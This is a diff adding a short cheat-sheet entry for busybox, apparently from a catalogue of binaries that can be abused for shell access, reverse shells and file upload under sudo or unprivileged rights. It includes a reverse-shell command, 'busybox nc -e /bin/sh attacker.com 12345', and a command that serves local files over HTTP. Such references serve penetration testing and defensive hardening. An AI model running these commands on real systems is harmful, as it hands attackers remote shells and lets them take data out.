@@ -1,0 +1,37 @@
+busybox
+=======
+
+Inherit
+-------
+
+[Sudo]
+    busybox ash
+
+[Unprivileged]
+    busybox ash
+
+[Sudo]
+    busybox cat
+
+[Unprivileged]
+    busybox cat
+
+Reverse shell
+-------------
+
+[Sudo]
+    busybox nc -e /bin/sh attacker.com 12345
+
+[Unprivileged]
+    busybox nc -e /bin/sh attacker.com 12345
+
+Upload
+------
+
+[Sudo]
+    busybox httpd -f -p 12345 -h .
+    This serves files in the local folder via an HTTP server.
+
+[Unprivileged]
+    busybox httpd -f -p 12345 -h .
+    This serves files in the local folder via an HTTP server.
